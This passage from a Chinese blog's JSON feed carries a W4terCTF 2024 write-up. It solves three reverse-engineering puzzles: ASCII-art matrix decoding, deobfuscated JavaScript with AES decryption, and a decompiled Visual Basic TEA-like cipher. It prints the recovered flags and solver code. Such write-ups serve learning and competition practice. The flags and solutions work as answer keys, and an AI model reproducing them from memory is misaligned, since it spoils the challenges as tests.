1&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;     111   111   111  111111              9     9111111&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;          1111111111111111111111111111111111           &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;       9      111111     9    1111111111111119         &#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;111   111111999111111  9   9111     111   9111        1&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">matrix_8020 = [</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">[<span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>, <span class=\"number\">49</span>, <span class=\"number\">49</span>, <span class=\"number\">32</span>]]</span><br><span class=\"line\"></span><br><span class=\"line\">str_array_8020 = [ (<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> line )) <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> matrix_8020]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(str_array_8020)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> str_array_8020:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> small_alpha_bet[i][<span class=\"number\">0</span>:<span class=\"number\">17</span>] == line:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(i+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)),end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> upper_alpha_bet[i][<span class=\"number\">0</span>:<span class=\"number\">17</span>] == line:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(i+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)), end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> num_bet[i][<span class=\"number\">0</span>:<span class=\"number\">17</span>] == line:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(i+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;0&#x27;</span>)), end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>结果为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">M O U N D W H I 7 e c r a B s</span><br></pre></td></tr></table></figure></p>\n<p>由此得到 flag</p>\n<p><code>W4terCTF&#123;1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_MOUND_WHI7e_craBs&#125;</code></p>\n<h2 id=\"doudou\"><a class=\"anchor\" href=\"#doudou\">#</a> DouDou</h2>\n<p>爬了 js 下来，用了 <code>restringer</code>  反混淆，得到关键函数如下：</p>\n<p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">check</span>(<span class=\"params\">q</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> V = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(q)),</span><br><span class=\"line\">    x = []</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> P = <span class=\"number\">0</span>; P &lt; <span class=\"number\">12</span>; P++) &#123;</span><br><span class=\"line\">    x.<span class=\"title function_\">push</span>(</span><br><span class=\"line\">      <span class=\"title function_\">e</span>(q[P])</span><br><span class=\"line\">        .<span class=\"title function_\">map</span>(<span class=\"function\">(<span class=\"params\">g</span>) =&gt;</span> g.<span class=\"title function_\">toString</span>(<span class=\"number\">16</span>).<span class=\"title function_\">padStart</span>(<span class=\"number\">2</span>, <span class=\"string\">&#x27;0&#x27;</span>))</span><br><span class=\"line\">        .<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  x = x.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (x == r + A + s + y + B + F + w + Q + b + p + i + f) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure></p>\n<p>最后 <code>x == ...</code>  后面的表达式也求出来了，是一个超长 16 进制字符串，太长不贴了。</p>\n<p>分析前面调用 <code>check(STEPS)</code>  的环节可以得到， <code>q</code>  会是一个 <code>[[int * 16] * 12]</code> ，而函数 <code>e</code> ，结合 hint 最终判断为 AES 加密，key 是 <code>W4terDr0pCTF2024</code> ，但是还没完，加密之前每个字节要先异或一个 <code>153</code> 。</p>\n<p>最后生成的 <code>x</code>  要等于那个超长字符串，才会进入 if 内生成 flag 的过程，得到 flag：</p>\n<p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> P = <span class=\"number\">0</span>; P &lt; <span class=\"number\">12</span>; P++) &#123;</span><br><span class=\"line\">  res += V[P].<span class=\"title function_\">map</span>(<span class=\"function\">(<span class=\"params\">g</span>) =&gt;</span> <span class=\"title class_\">String</span>.<span class=\"title function_\">fromCharCode</span>(g))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res = res.<span class=\"title function_\">replaceAll</span>(<span class=\"string\">&#x27;,&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> P = <span class=\"number\">0</span>; P &lt; res.<span class=\"property\">length</span>; P += <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">  flag += <span class=\"title class_\">String</span>.<span class=\"title function_\">fromCharCode</span>(<span class=\"built_in\">parseInt</span>(res.<span class=\"title function_\">slice</span>(P, P + <span class=\"number\">4</span>), <span class=\"number\">4</span>))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>大概就是 res 四个一组，parse 成一个四位四进制整数，再转 ascii 即可。这也就意味着 <code>res</code>  必须是 <code>^[0123]*$</code> ，这也可以检验得到 res 的过程是否正确，反正我们一次就出来了：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">final_x = <span class=\"string\">&quot;91d48f9e77505fe36b1537597d68a8be6ef1ced09bba7c9d4ea6a123042d47bbd5776d7b85eebbb7738de44b9af45f9b706640c8dac77d409ceb067e677e7290401e4852527e119b8095a636d0b628e1161142b7dfcbcf2ef890698ba5d279c78df2348e45d1aef635ebfb841284f6d67d1e9d0f0489bcdc5ba303bc791d0e18e46889fa856a463907d82a8137b7b2a863d1896d4dfcd6b84a2f55b50567f705ea7177187609da2e506182007b7e8244acf62c69de4f511760159ffc6dd8e9f5&quot;</span></span><br><span class=\"line\">aes = AES.new(<span class=\"string\">b&quot;W4terDr0pCTF2024&quot;</span>, AES.MODE_ECB)</span><br><span class=\"line\"></span><br><span class=\"line\">l = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> final_x:</span><br><span class=\"line\">    part_s = final_x[:<span class=\"number\">32</span>]</span><br><span class=\"line\">    final_x = final_x[<span class=\"number\">32</span>:]</span><br><span class=\"line\">    l2 = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> part_s:</span><br><span class=\"line\">        x = <span class=\"built_in\">int</span>(part_s[:<span class=\"number\">2</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">        l2.append(x)</span><br><span class=\"line\">        part_s = part_s[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    l.append(l2)</span><br><span class=\"line\"></span><br><span class=\"line\">l = [[x ^ <span class=\"number\">153</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> subl] <span class=\"keyword\">for</span> subl <span class=\"keyword\">in</span> l]</span><br><span class=\"line\">l = [<span class=\"built_in\">bytes</span>(subl) <span class=\"keyword\">for</span> subl <span class=\"keyword\">in</span> l]</span><br><span class=\"line\">l = [aes.decrypt(b) <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> l]</span><br><span class=\"line\"></span><br><span class=\"line\">ans = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> s:</span><br><span class=\"line\">        b = <span class=\"built_in\">int</span>(s[:<span class=\"number\">4</span>], <span class=\"number\">4</span>)</span><br><span class=\"line\">        s = s[<span class=\"number\">4</span>:]</span><br><span class=\"line\">        ans += <span class=\"built_in\">chr</span>(b)</span><br><span class=\"line\">ans</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight scheme\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">&#x27;jS_ls_In7erEStlng_ANd_QuaTeRN4rY_IS_al50_1Unny!!</span>&#x27;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"古老的语言\"><a class=\"anchor\" href=\"#古老的语言\">#</a> 古老的语言</h2>\n<p>用 VB 反编译器逆向，关键函数 <code>Fxxxtel</code>  如下：</p>\n<p><figure class=\"highlight vb\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Public</span> <span class=\"keyword\">Function</span> Fxxxtel(raw) <span class=\"comment\">&#x27;40F35C</span></span><br><span class=\"line\">  <span class=\"comment\">&#x27;Data Table: 40E3A8</span></span><br><span class=\"line\">  <span class=\"keyword\">Dim</span> var_B0 <span class=\"keyword\">As</span> <span class=\"type\">Long</span></span><br><span class=\"line\">  <span class=\"keyword\">Dim</span> var_B4 <span class=\"keyword\">As</span> <span class=\"type\">Long</span></span><br><span class=\"line\">  <span class=\"keyword\">Dim</span> var_B8 <span class=\"keyword\">As</span> <span class=\"type\">Long</span></span><br><span class=\"line\">  <span class=\"keyword\">Dim</span> var_BC <span class=\"keyword\">As</span> <span class=\"type\">Long</span></span><br><span class=\"line\">  <span class=\"keyword\">Dim</span> var_86 <span class=\"keyword\">As</span> <span class=\"type\">Integer</span></span><br><span class=\"line\">  loc_40F031: <span class=\"keyword\">For</span> var_AC = <span class=\"number\">0</span> <span class=\"keyword\">To</span> <span class=\"number\">9</span> <span class=\"keyword\">Step</span> <span class=\"number\">3</span>: var_A6 = var_AC <span class=\"comment\">&#x27;Integer</span></span><br><span class=\"line\">  loc_40F047:   var_B4 = raw(<span class=\"built_in\">CLng</span>(var_A6))</span><br><span class=\"line\">  loc_40F055:   var_B8 = raw(<span class=\"built_in\">CLng</span>((var_A6 + <span class=\"number\">1</span>)))</span><br><span class=\"line\">  loc_40F063:   var_BC = raw(<span class=\"built_in\">CLng</span>((var_A6 + <span class=\"number\">2</span>)))</span><br><span class=\"line\">  loc_40F06D:   <span class=\"keyword\">For</span> var_C0 = <span class=\"number\">1</span> <span class=\"keyword\">To</span> <span class=\"number\">&amp;H20</span>: var_A8 = var_C0 <span class=\"comment\">&#x27;Integer</span></span><br><span class=\"line\">  loc_40F089:     var_B0 = AddLong(<span class=\"number\">0</span>, -<span class=\"number\">1640531527</span>)</span><br><span class=\"line\">  loc_40F0FB:     var_B4 = var_B4 <span class=\"built_in\">Xor</span> AddLong(AddLong(LeftRotateLong(var_B8, <span class=\"number\">4</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">559038737</span>, var_B8 <span class=\"built_in\">Xor</span> var_B0), RightRotateLong(var_B8, <span class=\"number\">5</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">1161901314</span>)</span><br><span class=\"line\">  loc_40F16D:     var_B8 = var_B8 <span class=\"built_in\">Xor</span> AddLong(AddLong(LeftRotateLong(var_BC, <span class=\"number\">4</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">559038737</span>, var_BC <span class=\"built_in\">Xor</span> var_B0), RightRotateLong(var_BC, <span class=\"number\">5</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">1161901314</span>)</span><br><span class=\"line\">  loc_40F1DF:     var_BC = var_BC <span class=\"built_in\">Xor</span> AddLong(AddLong(LeftRotateLong(var_B4, <span class=\"number\">4</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">559038737</span>, var_B4 <span class=\"built_in\">Xor</span> var_B0), RightRotateLong(var_B4, <span class=\"number\">5</span>) <span class=\"built_in\">Xor</span> -<span class=\"number\">1161901314</span>)</span><br><span class=\"line\">  loc_40F1E5:   <span class=\"keyword\">Next</span> var_C0 <span class=\"comment\">&#x27;Integer</span></span><br><span class=\"line\">  loc_40F1F4:   var_A0(<span class=\"built_in\">CLng</span>(var_A6)) = var_B4</span><br><span class=\"line\">  loc_40F202:   var_A0(<span class=\"built_in\">CLng</span>((var_A6 + <span class=\"number\">1</span>))) = var_B8</span><br><span class=\"line\">  loc_40F210:   var_A0(<span class=\"built_in\">CLng</span>((var_A6 + <span class=\"number\">2</span>))) = var_BC</span><br><span class=\"line\">  loc_40F214: <span class=\"keyword\">Next</span> var_AC <span class=\"comment\">&#x27;Integer</span></span><br><span class=\"line\">  loc_40F21B: var_86 = <span class=\"number\">&amp;HFF</span></span><br></pre></td></tr></table></figure></p>\n<p>用 C 整理出的等价版本：</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">encrypt</span><span class=\"params\">(<span class=\"type\">uint32_t</span> *v)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> a = v[<span class=\"number\">0</span>], b = v[<span class=\"number\">1</span>], c = v[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">32</span>; i++) &#123;</span><br><span class=\"line\">    a = a ^ round_fn(b);</span><br><span class=\"line\">    b = b ^ round_fn(c);</span><br><span class=\"line\">    c = c ^ round_fn(a);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v[<span class=\"number\">0</span>] = a;</span><br><span class=\"line\">  v[<span class=\"number\">1</span>] = b;</span><br><span class=\"line\">  v[<span class=\"number\">2</span>] = c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint32_t</span> <span class=\"title function_\">round_fn</span><span class=\"params\">(<span class=\"type\">uint32_t</span> b)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">uint32_t</span> delta = <span class=\"number\">0x9e3779b9</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((left_rotate(b, <span class=\"number\">4</span>) ^ (<span class=\"number\">0xdeadbeef</span>)) + (b ^ delta) +</span><br><span class=\"line\">          (right_rotate(b, <span class=\"number\">5</span>) ^ (<span class=\"number\">0xbabecafe</span>)));</span><br></pre></td></tr></table></figure></p>\n<p>在这之后是一长串的 IF，判断 <code>var_A0</code>  的各个位是否等于一些硬编码的 32 位常数，将这些常数解密即可。</p>\n<p>可以看出这和 TEA 加密非常像，但是是三个一组的循环混淆，而非经典 TEA 的两个一组，而且把 TEA 轮函数加法和异或交换了，以及每次异或的是固定的 <code>delta</code>  而不是 <code>delta</code>  的累加。每次取三个 <code>u32</code>  一组，像这样交叉异或 32 轮。</p>\n<p>三个一组问题不大，把加密的顺序反过来异或回去可以了，原理是一样的：</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">decrypt</span><span class=\"params\">(<span class=\"type\">uint32_t</span> *v)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> a = v[<span class=\"number\">0</span>], b = v[<span class=\"number\">1</span>], c = v[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">32</span>; i++) &#123;</span><br><span class=\"line\">    c = c ^ round_fn(a);</span><br><span class=\"line\">    b = b ^ round_fn(c);</span><br><span class=\"line\">    a = a ^ round_fn(b);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v[<span class=\"number\">0</span>] = a;</span><br><span class=\"line\">  v[<span class=\"number\">1</span>] = b;</span><br><span class=\"line\">  v[<span class=\"number\">2</span>] = c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然而这样不对。hint 说要关掉的那个选项我看到了，关了之后重新复现了一遍，发现跟之前一点区别没有，心态炸了。</p>\n<p>最后一天晚九点，突发奇想把轮函数改了一下，把 <code>sum</code>  做异或，相当于只把轮函数的加法和异或互换的 TEA 算法，保留 <code>sum</code>  的部分不改，然后居然过了，有瞎蒙的成分在。</p>\n<p>事后注意到这一行：</p>\n<p><figure class=\"highlight vb\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">loc_40F089:</span>     var_B0 = AddLong(<span class=\"number\">0</span>, -<span class=\"number\">1640531527</span>)</span><br></pre></td></tr></table></figure></p>\n<p>那就意味着这一行的逆向是错的，应该是 <code>var_B0 = AddLong(var_B0, -1640531527)</code> ，不过没发现为什么。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "CTF",
                "ctf"
            ]
        },
        {
            "id": "https://taf.fyi/cs/devops/overleaf/",
            "url": "https://taf.fyi/cs/devops/overleaf/",
            "title": "OverLeaf自建记录",
            "date_published": "2024-04-18T16:00:00.000Z",
